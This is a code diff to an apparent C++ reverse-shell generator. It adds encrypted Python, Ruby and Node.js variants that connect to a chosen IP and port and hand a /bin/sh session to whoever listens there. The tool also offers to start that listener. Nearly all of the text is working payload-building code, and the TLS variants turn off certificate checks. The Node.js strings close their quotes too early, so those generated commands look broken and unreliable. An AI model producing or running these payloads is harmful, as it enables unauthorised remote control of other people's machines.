@@ -34,6 +34,9 @@ string perl(string ip, string port);
 string ruby(string ip, string port);
 string powershell(string ip, string port);
 string nodejs(string ip, string port);
+string python_ssl(string ip, string port);
+string ruby_ssl(string ip, string port);
+string nodejs_ssl(string ip, string port);
 
 int main()
 {
@@ -44,13 +47,15 @@ int main()
   string n,t,res,listener;
   string ip,port;
   std::cout<< GREEN << "[+]Choose an option from the menu below"<< RESET <<endl;
-  cout<< CYAN << "1.python\n2.netcat\n3.bash\n4.php\n5.ruby\n6.perl\n7.powershell\n8.nodejs"<< RESET <<endl<<endl;
+  cout<< CYAN << "1.python\n2.netcat\n3.bash\n4.php\n5.ruby\n6.perl\n7.powershell\n8.nodejs\n"
+          << "9.python (SSL)\n10.ruby (SSL)\n11.nodejs (SSL)"<< RESET <<endl<<endl;
   cout<<"Your Input(in words) : ";
   cin>>n;
 
   std::transform(n.begin(), n.end(), n.begin(), ::tolower);
 
-  if ((n!="python")&&(n!="netcat")&&(n!="bash")&&(n!="php")&&(n!="ruby")&&(n!="perl")&&(n!="powershell")&&(n!="nodejs"))
+  if ((n!="python")&&(n!="netcat")&&(n!="bash")&&(n!="php")&&(n!="ruby")&&(n!="perl")&&
+      (n!="powershell")&&(n!="nodejs")&&(n!="python-ssl")&&(n!="ruby-ssl")&&(n!="nodejs-ssl"))
   {
     cout<< RED <<"Invalid Input!\nexiting!"<< RESET <<endl;
     exit(0);
@@ -112,6 +117,18 @@ int main()
   else if(n=="nodejs")
   {
     cout<<"Your Node.js reverse shell is : "<< GREEN << nodejs(ip,port)<< RESET <<endl<<endl;
+  }
+  else if(n=="python-ssl")
+  {
+    cout<<"Your Python SSL reverse shell is : "<< BLUE << python_ssl(ip,port)<< RESET <<endl<<endl;
+  }
+  else if(n=="ruby-ssl")
+  {
+    cout<<"Your Ruby SSL reverse shell is : "<< MAGENTA << ruby_ssl(ip,port)<< RESET <<endl<<endl;
+  }
+  else if(n=="nodejs-ssl")
+  {
+    cout<<"Your Node.js SSL reverse shell is : "<< GREEN << nodejs_ssl(ip,port)<< RESET <<endl<<endl;
   }
 
 cout<< GREEN <<"[+]Do You want to start the listener ?[Y/N]"<< RESET <<endl;
@@ -223,6 +240,39 @@ string nodejs(string ip, string port)
     string shell;
     shell = "node -e 'const net=require(\"net\"),cp=require(\"child_process\"),sh=cp.spawn(\"/bin/sh\",[]);'";
     shell += "const client=new net.Socket();client.connect(" + port + ",\"" + ip + "\",function(){";
+    shell += "client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);});'";
+    return shell;
+}
+
+string python_ssl(string ip, string port)
+{
+    string shell;
+    shell = "python3 -c 'import ssl,socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);";
+    shell += "s=ssl.wrap_socket(s);s.connect((\"" + ip + "\"," + port + "));";
+    shell += "os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);";
+    shell += "import pty;pty.spawn(\"/bin/sh\")'";
+    return shell;
+}
+
+string ruby_ssl(string ip, string port)
+{
+    string shell;
+    shell = "ruby -rsocket -ropenssl -e '";
+    shell += "context=OpenSSL::SSL::SSLContext.new(:TLSv1);";
+    shell += "s=TCPSocket.new(\"" + ip + "\"," + port + ");";
+    shell += "ssl=OpenSSL::SSL::SSLSocket.new(s,context);";
+    shell += "ssl.connect;";
+    shell += "while(cmd=ssl.gets);IO.popen(cmd.to_s,\"r\"){|io|ssl.print io.read}end'";
+    return shell;
+}
+
+string nodejs_ssl(string ip, string port)
+{
+    string shell;
+    shell = "node -e 'const tls=require(\"tls\");const cp=require(\"child_process\");";
+    shell += "const sh=cp.spawn(\"/bin/sh\",[]);";
+    shell += "const client=tls.connect(" + port + ",\"" + ip + "\",";
+    shell += "{rejectUnauthorized:false},function(){";
     shell += "client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);});'";
     return shell;
 }
